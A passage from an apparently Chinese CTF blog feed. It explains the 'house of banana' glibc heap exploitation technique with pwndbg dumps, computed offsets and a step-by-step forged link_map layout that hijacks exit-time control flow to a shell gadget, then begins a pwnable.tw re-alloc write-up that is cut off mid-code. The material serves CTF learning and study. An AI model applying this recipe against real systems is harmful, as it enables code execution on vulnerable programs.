(l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class=\"line\">\t\t\t\t\t    / <span class=\"keyword\">sizeof</span> (ElfW(Addr)));</span><br><span class=\"line\">\t\t\t  <span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t    ((<span class=\"type\">fini_t</span>) <span class=\"built_in\">array</span>[i]) ();\t\t\t\t\t<span class=\"comment\">//目标位置</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结下我们需要绕过那些检查</p>\n<ol>\n<li>\n<p>判断 <code>_ns_loaded</code>  链表中至少有三个节点（dl-fini 开始部分通过循环遍历链表，做检查，）</p>\n</li>\n<li>\n<p>检查 <code>l == l-&gt;l_real</code></p>\n</li>\n<li>\n<p>检查 <code>l-&gt;l_init_called &gt; 8</code>            这个其实跟数据的处理有关</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_relocated:<span class=\"number\">1</span>;\t<span class=\"comment\">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_init_called:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if DT_INIT function called.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_global:<span class=\"number\">1</span>;\t<span class=\"comment\">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_reserved:<span class=\"number\">2</span>;\t<span class=\"comment\">/* Reserved for internal use.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_phdr_allocated:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if the data structure pointed</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tto by `l_phdr&#x27; is allocated.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_soname_added:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if the SONAME is for sure in</span></span><br></pre></td></tr></table></figure>\n<p>在 lunk_map 结构体中，这个变量是 4 字节，与结构体开始位置的偏移量为 0x31c。pwndbg 帮我们解释了数据的结果，这里的数据要大于 8，我们不妨之际设置为 9. 不同节点可以有所差异，下面是一个结果为 1 的数据</p>\n<p><img data-src=\"p4.png\" alt=\"p4\"></p>\n<p>以及一个不为 1 的数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> link_map *)<span class=\"number\">0x7f56e43ba7d0</span></span><br><span class=\"line\">$<span class=\"number\">5</span> = &#123;</span><br><span class=\"line\">  l_addr = <span class=\"number\">140725148598272</span>,</span><br><span class=\"line\">  l_name = <span class=\"number\">0x7ffd207e4371</span> <span class=\"string\">&quot;linux-vdso.so.1&quot;</span>,</span><br><span class=\"line\">  l_ld = <span class=\"number\">0x7ffd207e43e0</span>,</span><br><span class=\"line\">  l_next = <span class=\"number\">0x7f56e4382000</span>,</span><br><span class=\"line\">  l_prev = <span class=\"number\">0x7f56e43ba220</span>,</span><br><span class=\"line\">  l_real = <span class=\"number\">0x7f56e43ba7d0</span>,</span><br><span class=\"line\">...</span><br><span class=\"line\">  l_relocated = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_init_called = <span class=\"number\">0</span>,</span><br><span class=\"line\">  l_global = <span class=\"number\">0</span>,</span><br><span class=\"line\">...</span><br><span class=\"line\">pwndbg&gt; x/wx <span class=\"number\">0x7f56e43ba7d0</span>+<span class=\"number\">0x31c</span></span><br><span class=\"line\"><span class=\"number\">0x7f56e43baaec</span>:\t<span class=\"number\">0x00000005</span></span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>检查 <code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code> ，unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</p>\n</li>\n</ol>\n<p>​\tDT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28，所以 l_info [26], 以及 l_info [28] 不能是 null (28 是因为 i 会影响到函数 ((fini_t) array [i]) (); 调用)</p>\n<p>下面我们具体说说如何伪造，我选择利用修改第三节点的 l_next 指针，指向一个 chunk, 并在 chunk 上部署我们伪造的 link_map. 这里依赖任意地址写，可通过 largebin attack 实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global 符号并不在 libc 文件，而是在 ld.so 文件中，我们要泄露出程序的 ld 基址，pwndbg 为我们提供了一个函数求偏移量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class=\"line\"><span class=\"number\">0x7f56e43b9040</span>-&gt;<span class=\"number\">0x7f56e4382018</span> is <span class=\"number\">-0x37028</span> bytes (<span class=\"number\">-0x6e05</span> words)</span><br></pre></td></tr></table></figure>\n<p>由此我们就知道了需要向哪里写入 chunk.</p>\n<p>接下来就是重点，我们如何伪造 link_map.</p>\n<p>因为原来的链表中只有 4 个节点，而我们伪造的 link_map 有恰是第四个，所以，l_next 就是 0，l_prve 无所谓，直接写 0 即可。l_real 就是我们的伪造的 link_map 的开始地址，也是我们修改后的第三节点的 l_next 的值。这几个值离 link_map 的首地址很近，可以很直接的看出偏移量。接下来就是 l_info 的伪造。l_info [26] 不为 0，这是结构体内的数组，distance 可以得到 info [26] info [28] 关于节点地址的偏移量，同样我们可以得到上面提到的 l_init_called 的偏移量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class=\"number\">26</span>]</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba330</span> is <span class=\"number\">0x110</span> bytes (<span class=\"number\">0x22</span> words)</span><br><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class=\"number\">28</span>]</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba340</span> is <span class=\"number\">0x120</span> bytes (<span class=\"number\">0x24</span> words)</span><br><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba53c</span> is <span class=\"number\">0x31c</span> bytes (<span class=\"number\">0x63</span> words)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>重点来了，info 这连个位置我们写入什么数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  l_info = &#123;<span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072f8</span>, <span class=\"number\">0x8</span>, <span class=\"number\">0x7f56e4244cec</span> &lt;__execvpe+<span class=\"number\">652</span>&gt;, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072e0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072e8</span>, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x9</span>, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t  ElfW(Addr) *<span class=\"built_in\">array</span> =</span><br><span class=\"line\">\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class=\"line\">\t\t\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ <span class=\"keyword\">sizeof</span> (ElfW(Addr)));</span><br><span class=\"line\">\t\t\t  <span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t    ((<span class=\"type\">fini_t</span>) <span class=\"built_in\">array</span>[i]) ();\t\t\t\t\t<span class=\"comment\">//目标位置</span></span><br></pre></td></tr></table></figure>\n<p>这是一个比较通用的 info，0x7f56e4244cec &lt;__execvpe+652&gt; 是我们想要执行的函数。</p>\n<p>我们再看源码的相关部分，正常情况下，exit 使用的就是第四个节点的 l_info 的数据，也就是使用我们伪造的 info。</p>\n<p>sizeof (ElfW (Addr)) = 8，为了方便解释，我们将这里 l-&gt;l_info [DT_FINI_ARRAYSZ] 的数据记为 ptr，ptr-&gt;d_un.d_ptr, 其实就是 ptr+0x8 所指向的数据。ptr 是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得 shell，我们不妨让 i =1, 然后我们需要在 ptr+8 的位置写入的就是 1*8=8</p>\n<p>我们还要确定的是 arry 数组。(l-&gt;l_addr+ l-&gt;l_info [DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p>\n<p>l-&gt;addr 其实就是我们伪造的 link_map 开始的位置，个人喜欢将这里写为 0，然后将 l_info [26] 写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为 ptr_a, 这个就会给 arry 赋值，然后\tarry [i]\t====&gt;&gt;  就是调用 ptr_a +8*i 位置的函数。也就是我们的后门。</p>\n<p>提供一个构造的布局，</p>\n<p>在 <code>fake+0x110</code>  写入一个 ptr_a，且 ptr_a+0x8 处有 ptr，ptr 处写入的是最后要执行的函数地址.</p>\n<p>在 <code>fake+0x120</code>  写入一个 ptr，且 ptr+0x8 处是 <code>i*8</code> 。</p>\n<p>我选择的是 <code>fake+0x110</code>  写入 <code>fake+0x40</code> ，在 <code>fake+0x48</code>  写入 <code>fake+0x58</code> ，在 <code>fake+0x58</code>  写入 shell</p>\n<p>我选择在 <code>fake+0x120</code>  写入 <code>fake+0x48</code> ，在 <code>fake+0x50</code>  处写入 8.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tel <span class=\"number\">0x55a656f072a0</span>(fake) <span class=\"number\">40</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x55a656f072a0</span> ◂— <span class=\"number\">0x0</span>\t\t\t\t\t\t\t<span class=\"comment\">//l_addr</span></span><br><span class=\"line\">... ↓     <span class=\"number\">4</span> skipped</span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│  <span class=\"number\">0x55a656f072c8</span> —▸ <span class=\"number\">0x55a656f072a0</span> ◂— <span class=\"number\">0x0</span>\t\t\t\t<span class=\"comment\">//l_real</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│  <span class=\"number\">0x55a656f072d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│  <span class=\"number\">0x55a656f072d8</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0x55a656f072e0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0048</span>│  <span class=\"number\">0x55a656f072e8</span> —▸ <span class=\"number\">0x55a656f072f8</span> —▸ <span class=\"number\">0x7f56e4244cec</span> (execvpe+<span class=\"number\">652</span>) ◂— mov    rdx, r12</span><br><span class=\"line\"><span class=\"number\">0</span>a:<span class=\"number\">0050</span>│  <span class=\"number\">0x55a656f072f0</span> ◂— <span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">0058</span>│  <span class=\"number\">0x55a656f072f8</span> —▸ <span class=\"number\">0x7f56e4244cec</span> (execvpe+<span class=\"number\">652</span>) ◂— mov    rdx, r12</span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0060</span>│  <span class=\"number\">0x55a656f07300</span> ◂— <span class=\"number\">0xa</span> /</span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0068</span>│  <span class=\"number\">0x55a656f07308</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0070</span>│  <span class=\"number\">0x55a656f07310</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0f</span>:<span class=\"number\">0078</span>│  <span class=\"number\">0x55a656f07318</span> ◂— <span class=\"number\">0x41</span></span><br><span class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0080</span>│  <span class=\"number\">0x55a656f07320</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓     <span class=\"number\">6</span> skipped</span><br><span class=\"line\"><span class=\"number\">17</span>:<span class=\"number\">00b</span>8│  <span class=\"number\">0x55a656f07358</span> ◂— <span class=\"number\">0x41</span></span><br><span class=\"line\"><span class=\"number\">18</span>:<span class=\"number\">00</span>c0│  <span class=\"number\">0x55a656f07360</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓     <span class=\"number\">6</span> skipped</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│  <span class=\"number\">0x55a656f07398</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"><span class=\"number\">20</span>:<span class=\"number\">0100</span>│  <span class=\"number\">0x55a656f073a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">21</span>:<span class=\"number\">0108</span>│  <span class=\"number\">0x55a656f073a8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">22</span>:<span class=\"number\">0110</span>│  <span class=\"number\">0x55a656f073b0</span> —▸ <span class=\"number\">0x55a656f072e0</span> \t<span class=\"comment\">//l_info[26]</span></span><br><span class=\"line\"><span class=\"number\">23</span>:<span class=\"number\">0118</span>│  <span class=\"number\">0x55a656f073b8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">24</span>:<span class=\"number\">0120</span>│  <span class=\"number\">0x55a656f073c0</span> —▸ <span class=\"number\">0x55a656f072e8</span>  <span class=\"comment\">//l_info[28]</span></span><br><span class=\"line\"><span class=\"number\">25</span>:<span class=\"number\">0128</span>│  <span class=\"number\">0x55a656f073c8</span> ◂— <span class=\"number\">0xa</span> </span><br><span class=\"line\"><span class=\"number\">26</span>:<span class=\"number\">0130</span>│  <span class=\"number\">0x55a656f073d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">27</span>:<span class=\"number\">0138</span>│  <span class=\"number\">0x55a656f073d8</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后我们就是利用 onegadget 获得 shell 了。</p>\n<p>利用 gdb 万能必挂点，结合 one_gadget 工具帮助我们快速找到合适的 one_gadget</p>\n<p><img data-src=\"./p5.png\" alt=\"p5\"></p>\n<h5 id=\"一些注意点\"><a class=\"markdownIt-Anchor\" href=\"#一些注意点\">#</a> 一些注意点：</h5>\n<p>​\t因为_rtld_global 这个符号是存在与 ld.so 文件中，往往出题人不会给出 ld.so 文件，，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得到远程环境的精确偏移</p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h2>\n<p>​\t\t本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本 Glibc-2.34 0ubuntu3.2 的可行性。因为 2.34 主要问题还是在于一些 hook 函数被禁止，以及对_IO_str_finish、_IO_str_overflow 变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位 ctfer 来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在 3.2 版本之前，我们依旧可以通过修改 vtable 劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个 hook 的符号，而是其他的符号)。house of kiwi, 攻击 exit_hook 依旧是可以实现，且比较方便的。</p>\n<p>​\t后面我这里主要介绍了 house of banana, 这项技术，依旧是用于 3.2，并且向下兼容。简要概括，就是修改第三个节点的 l_next 为堆地址 fake，并在该堆上伪造第四个节点。</p>\n<p>伪造 link_map</p>\n<ol>\n<li>​\t\t\t\t *(fake+0x28)=fake。</li>\n<li>​\t\t\t\t*(fake +0x48)=fake+0x58,   *(fake+0x50) = 0x8</li>\n<li>​\t\t\t\t*(fake+0x58) = shell</li>\n<li>​\t\t\t\t*(fake+0x110) = fake+0x40</li>\n<li>​\t\t\t\t*(fake+0x120) = fake+0x48</li>\n<li>​\t\t\t\t(int)*(fake+0x31c) = 0x9</li>\n</ol>\n<p>最后笔者在这里提出一个未完成的验证，house of emma 在 3.2 版本下的利用.</p>\n<p>​\t\t因为个人实力依旧比较菜，文章出可能会出现错误及不足，欢迎斧正。也希望能和对此文感兴趣的师傅进一步交流关于新版本的利用姿势。</p>\n<p>​\t[参考]：</p>\n<p>​\t想到验证各种姿势，感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydWFuNzc3LmdpdGh1Yi5pby8=\"> ru7n</span> 师傅</p>\n<p>​\t3.2 下攻击 exit_hook 的思考，感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjQ4Mzc4Nz90eXBlPWJsb2c=\"> Ayaka</span> 师傅</p>\n<p>​\thouse of banana 的最初构想\t感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci8xNDY4Nzg=\"> ha1vk</span> 师傅</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "http://example.com/2022/05/13/pwnable-re-alloc/",
            "url": "http://example.com/2022/05/13/pwnable-re-alloc/",
            "title": "pwnable-re-alloc",
            "date_published": "2022-05-13T08:28:21.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL1B3bmFibGUudHc=\">Pwnable.tw</span> \tre-alloc</h1>\n<p>说明：因为没有合适的 glibc 资源（自已懒），这里只是进行了一个理论分析。</p>\n<h2 id=\"环境保护\"><a class=\"markdownIt-Anchor\" href=\"#环境保护\">#</a> 环境保护</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ checksec --file=re-alloc</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols\t  Yes\t1\t\t2\t\tre-alloc</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ strings libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/re-alloc$ </span><br></pre></td></tr></table></figure>\n<p>2.29 的一个 glibc，这里要注意的就是对 tcache 一个保护机制，将 tcache_chunk 的包括指针指向了 tcache。没有 pie 的保护。</p>\n<p>而且 RELRO 没有全开，就意味着我们可以修改 got 表。只要我们有办法泄露出 libc。以及任意地址写。</p>\n<h2 id=\"代码分析\"><a class=\"markdownIt-Anchor\" href=\"#代码分析\">#</a> 代码分析</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;byte_402070);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   1. Alloc               $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   2. Realloc             $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   3. Free                $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$   4. Exit                $&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your choice: &quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要实现了增删，全局没有 malloc 函数，但是 realloc 内在内部调用 malloc。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span 